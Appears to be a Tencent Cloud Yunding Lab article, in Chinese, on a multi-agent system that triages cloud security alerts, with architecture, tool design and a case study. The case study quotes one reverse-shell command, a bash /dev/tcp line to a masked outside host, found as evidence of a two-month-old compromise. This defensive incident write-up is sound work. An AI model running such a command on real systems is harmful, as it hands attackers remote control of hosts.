---
title: 97.7% 告警降噪：腾讯云安全运营Agent实践
url: https://mp.weixin.qq.com/s/Rirx0LftwRtrZZlBxkNNFA
source: Doonsec's feed
date: 2026-05-22
fetch_date: 2026-05-23T05:35:58.911795
---

# 97.7% 告警降噪：腾讯云安全运营Agent实践

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VL7Qr6N3skg8hgFYBW6UTr62E3sCGtKzQlNJlnYbuMsT1nbDpdEK6dog4eRDuibUdeNf8acLSad0x0HI6uzjhtKTZXW9mDDu2Jel01BMQpKA/0?wx_fmt=jpeg)

# 97.7% 告警降噪：腾讯云安全运营Agent实践

云鼎实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下案例源自于腾讯云鼎实验室使用Agent进行告警研判的研究与实践。

**“一条本应被忽略的"攻击失败"告警，Agent却从中发现了2个月前的入侵。”**

***做了什么？***

针对于腾讯云的安全告警，云鼎引入Agent自动研判安全告警，把"每条告警都靠人看"变成"Agent先筛、人只看重点"。

**1、实践成果：告警降噪率提升至97.7%**

![图片](https://mmbiz.qpic.cn/mmbiz_png/iczOE5KEJun4RfsYYr4sFoZ2HqtrIgbNBeALCOGsOcCjYaib4CfNhzcKc1WQdsHrC18VpJJFZUWJCD2kujqLZEyMoodd8BF8DiaicwzkQQ9mAzQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

**2、技术思路：日常帮你不漏报，红蓝演练帮你省人力**

* Plan-React-Analysis架构：把复杂的告警分析拆成"规划→调查→研判"三步，多个Agent分工协作，比单个Agent分析更快、更稳定。

* 60+腾讯云安全MCP工具：Agent可以调用情报查询、腾讯云资产画像、日志、告警等60多个工具，像安全专家一样"主动调查"。

* 13类高频告警全覆盖：异常登录、恶意程序、危险命令、网络攻击等最常见的告警类型都能自动研判。后续会覆盖更多告警。

***运营痛点：告警太多，人手不够***

**1、以"某MMORPG游戏公司"为例：**

* 7天原始告警**17万条**，经同特征聚合后**1834条**，Agent研判后真正需关注的仅**42条**。

* 按每条5分钟，处理1834条需**153小时/周 ≈ 4人全职**。

理论上，97.7%的"噪音"不应忽略，不能漏掉真实入侵。

**实际情况**

* 日常：高频告警被"选择性忽视"，只看态势大盘，不逐条分析。常可能漏掉真正入侵（见第四章案例）。

* 红蓝对抗/重保：临时抽调人力值守，逐条查看。

**Agent介入后**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun7ibSuVmr98eibV7fq5CYziaJxrcmXuPvLbpNop8B2Ep2TAoicCWhCpNyjK0xVQgubgKwGgIicWKtD1Wc17bu4M5zltAISogqMjMExE/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1)

尤其是其中一条原本被忽视的告警，Agent发现了隐藏2个月的入侵，这一点也证明了Agent在安全告警上的价值：持续值守、不漏报。

**2、传统方案 VS Agent方案**

**传统方案**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun6LhYY6degDicdN6sSoaBwOlbCxNvAfxoC3awgCvdpibkniblYhpv2D6yqFgz9YGlfIg0JpvJfmT2SPv8EhXkAlqsbIibAPTWoSFia0/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2)

**Agent方案**

![图片](https://mmbiz.qpic.cn/mmbiz_png/iczOE5KEJun7tNG4fPbwv3AWT2mNTOZ9aYyRYkHicoXUqBo4RGQ8xegumeHVrN2KqkG4y7kZReM6osCZ9ZnpoThNPsibZev6skxfFWJNay6aK0/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3)

***如何让Agent来做安全运营？***

1、腾讯云安全运营智能体平台五层告警研判体系

**第一层：告警数据源**

* 接入主机安全、容器安全、云防火墙、WAF等

**第二层：告警触发与归并层**

* 筛选需分析的告警(未阻断的、危险告警)进行触发

* 按关键维度归并（如异常登录：同源IP+同目的IP+同用户名）

**第三层：Multi-Agent研判引擎**

以"异常登录"告警为例，Agent会像安全专家一样展开调查：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun71gGYhyEYuO2sbsV6QcdTfY8fYCskibZ3fXboEInvYHt0pR2ibg4UC2xA17ibYDyficF9vic4nF2ibHt3lPZ0PygEMk9KmSWdfdzW4g/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4)

**三阶段流程说明**

**![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun6K7icc2owoicrcKsqNgwdF7dtXnHKpvAvS2SFbqpruD8mNI4JhUNgLM1yazmujleFyOr8EvNnNmC8ZJIxRbuFTjica9OcSTAFdRk/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5)**

**各阶段输入输出（以异常登录为例）**

![图片](https://mmbiz.qpic.cn/mmbiz_png/iczOE5KEJun5WYRz2mjh74gLyQMQibLZVxquVT1pCubsv31BjzJiaKbJpeDmD8JbkHe9zINicc90B2dHEDebSTYvFY3HJn5T9NowJj8dsZSxOW0/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6)

**7个调查维度（以异常登录为例）：**
1.**威胁情报**：源IP是否被标记为恶意？
2.**攻击历史**：这个IP近期有没有发起过攻击？
3.**登录基线**：用户平时从哪些IP登录？这次是否异常？
4.**登录后行为**：登录成功后执行了什么命令？有没有可疑操作？
5.**告警关联**：这台主机近期还有其他告警吗？
6.**漏洞风险**：主机有弱口令或高危漏洞吗？
7.**资产画像**：这是什么业务的机器？暴露在公网吗？

**第四层：MCP工具层**

* 60+工具，覆盖情报、资产、基线、日志等

* 为Agent设计，返回结构化精简数据

**第五层：输出层**

* 结论 + 证据链 + 处置建议

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun4uc6dEeTSpKWZYxFeG6L1DHThax5hkYX55YvmC13F1o4JHVtu6FQzzzngjrCzzCSxU8or4V0XEqwW2oNia3zhxhwU908eWCVa8/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=7)

2、**为什么用Multi-Agent而不是单Agent？**

单Agent模式让一个Agent"一口气"完成所有调查，但问题很多：

* 上下文爆炸：提示词太长，Agent容易迷失

* 工具选择混乱：60+工具放在一起，Agent经常调错

* 分析不稳定：成功率只有75%，1/4的概率连结果都输出不了

![图片](https://mmbiz.qpic.cn/mmbiz_png/iczOE5KEJun6d9SUfHzY1eqjGhYuvmU2MLAqYJZcWA56DHjibviaCAsVYicjAJbEm4PjCia1tgDiaIOgueYDAJWsyibHpEUOLvmHYBYJzLibblWgs6I/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=8)

**3、腾讯云安全运营智能体平台MCP工具体系**

MCP（Model Context Protocol）让Agent调用外部数据。设计原则：**Agent负责"想"，工具负责"查"**。

**工具设计要点：为Agent优化返回内容**

直接把全部数据原样返回给Agent，会有两个问题：

* Token消耗高：原始数据字段多、冗余大

* Agent理解困难：字段命名不直观，可能导致Agent"猜"含义；引入过多数据，影响注意力

**云鼎的做法是对返回内容做预处理：**

* 精简字段：只返回Agent决策需要的信息

* 易读命名：字段名让Agent一看就懂（如is\_malicious而非type\_3）

* 预聚合：能提前算好的就算好，减少Agent推理负担

示例：用户登录位置基线工具

1.工具：QueryCWPAccountLoginLocationTool
2.功能：统计登录地理位置分布，返回Top10常用登录地及次数
3.输入：Quuid、UserName、AlarmTime、Offset（默认30天）
4.输出：{"LocationSet": [{"Location": "广东-深圳", "Count": 156}, ...]}

Agent据此判断：“用户历史只在深圳、北京登录，这次从俄罗斯登录，需关注”。

***案例还原，Agent如何发现隐藏入侵？***

2025年11月3日，**某MMORPG游戏公司**出现“攻击失败的远程代码执行”告警，传统处理：归类为"攻击尝试，无失陷"——攻击被拦截了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/iczOE5KEJun5Df4yzyNkPxkibdFoXRauKgXRDPboMckgsdhYhc7Fdds32twVtV20gpicEJiccNtaobuJLArICVKMTGTahBQkVumrj9bfNPp16cY/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=9)

**1、介入Agent调查过程**

Step 1: **Plan Agent分析**

* 识别：网络攻击（PHP RCE）

* 任务：分析载荷、确认目标服务、检查是否失陷

Step 2: **SubAgent并行调查**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun5H8SNiawmoswOVBUo4TklP1jImNw3MorRDHEo2wCG32a7SNuribFiaQf4Q0OCBZsbQkJQkM8icAAjLHWyMhV6qUkUtuhx1MnaTgJY/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=10)

Step 3: **Analysis Agent研判**

结论：安全事件（高危）
发现：本次攻击被拦截，但php-fpm在2025年10月20日 22:50:02
曾执行反弹Shell：sh -c bash -i >& /dev/tcp/85.19.xxx/6667 0>&1
该进程目前仍在运行（PID:20775）。
判定：主机2个月前已失陷，攻击者已获控制权。
建议：
1. 断开与C2服务器85.19.xxx的连接
2. 清除进程PID:20775
3. 排查入侵路径，修复PHP漏

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun7vpng3WaUEe9wWsjdibGt0bl5dqjDibXE3DSFmO2SYKvHdPJgiciaib3whyArh10VEDBCR4hhwWrLrickqsTjCKuEpK6LaP6h3ywcg8/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=11)

**2、介入Agent之后的降噪率变化**

介入Agent后，该公司2026年1月22日-28日真实告警数据降噪率变化如下

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun78FrnsehnKL5qvE6vKvjFKxpblAhDfZ5JvMP8HicuXIW7x5gDrcrOp8mzQibxgP6GCCRibzCFQD4zPibS04rJh8y7AujRM7WOicUDA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=12)

样本量较多的场景准确率如下：

![图片](https://mmbiz.qpic.cn/mmbiz_png/iczOE5KEJun4XFIDhXFhLUaELKUOHpJngcssAOBWMFzhuNROyapzHDibeUnNIFQ6fOGECamVRRYRvw2TvDE7CvicnWC1ba8LPo1ibUD3eiaVqKxo/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=13)

Agent的优势在于"不嫌麻烦"——把容易被跳过的关联分析逐项完成

***安全运营Agent，是不是"接个模型"就行？***

**1、是不是"接个大模型"就能做**

Agent研判告警的核心不仅是模型，还要**让Agent能获取数据、让它思考、验证输出**。

* 给它数据：**60+工具**让Agent能查到威胁情报、主机资产、登录日志等数据。

* 让它思考：**13类场景的提示词**，告诉Agent每种告警该怎么分析、关注什么。

* 验证输出：**持续追踪准确率**，发现badcase就优化，让Agent越用越可靠。

**2、Multi-Agent的价值**

* 分而治之：把"分析一条告警"拆成多个小任务，每个任务**更简单、更可控**。

* 专业分工：每个SubAgent只负责一类调查（查情报、查资产、查日志），**做到专业**。

* 可维护：某个场景出问题，只需改对应的SubAgent，**不影响其他场景**。

目前，腾讯云安全中心已封装60+安全数据获取工具，包括情报、资产、基线、日志、告警统计等能力，对接主机安全、容器安全、云防火墙、WAF等产品数据，现已开放试用，欢迎扫码申请~

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/iczOE5KEJun5mwIKX36Q2YFMsP9hLYJECzV1G6t2USoKaxhicuQw6843e95Z7wdIR9TNscdABbtunKn4ZMyibqKnjFp5ECfcf6qvkBicricUXjbI/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=14)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/FIBZec7ucChYUNicUaqntiamEgZ1ZJYzLRasq5S6zvgt10NKsVZhejol3iakHl3ItlFWYc8ZAkDa2lzDc5SHxmqjw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6)

**END**

更多精彩内容点击下方扫码关注哦~

关注云鼎实验室，获取更多安全情报

![图片](https://mmbiz.qpic.cn/mmbiz_png/NNSr7XSrt0mfEkibaEU8uriaORBdj9W37EhEIZlIFuzudKVafyia4vTv1q1usxN57bsdeAY4icwcKw9qJ1W4COeR4Q/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NNSr7XSrt0miaxYvNtxDpUF6cHu3RxDXicIEQ8f8tephDpMFS0sczGA1vwwZKyT2sEjgwh1D5yxVxLRoalY8x2ZA/0?wx_fmt=png)

云鼎实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NNSr7XSrt0miaxYvNtxDpUF6cHu3RxDXicIEQ8f8tephDpMFS0sczGA1vwwZKyT2sEjgwh1D5yxVxLRoalY8x2ZA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过